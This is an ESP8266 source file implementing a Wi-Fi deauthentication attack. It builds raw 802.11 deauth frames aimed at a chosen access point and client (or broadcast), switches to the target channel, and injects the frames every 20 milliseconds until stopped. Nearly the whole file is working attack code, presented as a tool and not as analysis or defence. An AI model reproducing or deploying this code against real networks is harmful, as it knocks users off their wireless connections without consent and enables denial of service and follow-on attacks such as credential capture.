#include "deauth.h"
#include <ESP8266WiFi.h>
#include <user_interface.h>

Ticker deauthTicker;
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,  // type, subtype, duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // destination MAC (victim)
  0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,  // source MAC (AP)
  0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,  // BSSID (AP)
  0x00, 0x00,  // sequence number
  0x07, 0x00   // reason code: Class 3 frame received from nonassociated station
};
int deauthPacketCount = 0;

void sendDeauthTick() {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacketCount++;
}

void startDeauth(uint8_t *ap, uint8_t *client, int channel) {
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_enable(0);
    delay(10);
    wifi_set_channel(channel);
    delay(10);
    wifi_promiscuous_enable(1);

    memcpy(deauthPacket + 4, client, 6);  // Destination (victim or broadcast)
    memcpy(deauthPacket + 10, ap, 6);     // Source MAC (AP)
    memcpy(deauthPacket + 16, ap, 6);     // BSSID (AP)

    deauthPacketCount = 0;
    deauthTicker.attach_ms(20, sendDeauthTick);

    Serial.printf("[ESP8266] Deauthing from %02X:%02X:%02X:%02X:%02X:%02X\n",
        ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
}


void stopDeauth() {
    deauthTicker.detach();
    Serial.println("[ESP8266] Deauth stopped");
}
